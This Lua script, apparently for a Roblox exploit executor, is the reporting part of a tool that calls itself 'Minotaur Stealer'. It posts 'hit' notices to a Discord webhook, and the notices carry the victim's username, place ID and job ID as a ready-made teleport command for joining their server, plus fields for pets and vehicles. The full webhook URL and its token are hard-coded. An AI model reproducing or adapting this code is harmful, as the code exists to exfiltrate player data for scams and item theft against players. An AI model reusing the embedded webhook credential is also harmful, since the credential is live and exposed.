local username1 = game.Players.LocalPlayer.Name
local TeleportService = game:GetService("TeleportService")

local placeId = game.PlaceId
local jobId = game.JobId

function SendMessage(url, message)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["content"] = message
    }
    local body = http:JSONEncode(data)
    local response = request({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = body
    })
    print("Sent")
end

function SendMessageEMBED(url, embed)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["embeds"] = {
            {
                ["title"] = embed.title,
                ["description"] = embed.description,
                ["color"] = embed.color,
                ["fields"] = embed.fields,
                ["footer"] = {
                    ["text"] = embed.footer.text
                }
            }
        }
    }
    local body = http:JSONEncode(data)
    local response = request({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = body
    })
    print("Sent")
end


--Examples 

local url = "https://discord.com/api/webhooks/1251979519632609352/HoijK628GLjjIRVcDltXFzVJZD7A1HcDjhbsJaEVUSnXlKkM9pg2CY4fvTv_J4ioGk8C"
SendMessage(url, "A New Hit!")


local embed = {
    ["title"] = username1 .. " Executed The Minotaur Script ",
    ["description"] = "Minotaur Stealer has a new hit for you!",
    ["color"] = 65280,
    ["fields"] = {
        {
            ["name"] = "Pets:",
            ["value"] = "0"
        },
        {
            ["name"] = "Vehicles:",
            ["value"] = "0"
        },
        {
            ["name"] = "Join Script:",
            ["value"] = "```TeleportService:TeleportToPlaceInstance(" .. placeId .. ", " .. jobId ..")```"
        }
    },
    ["footer"] = {
        ["text"] = "Made By Bredzio"
    }
}
SendMessageEMBED(url, embed)
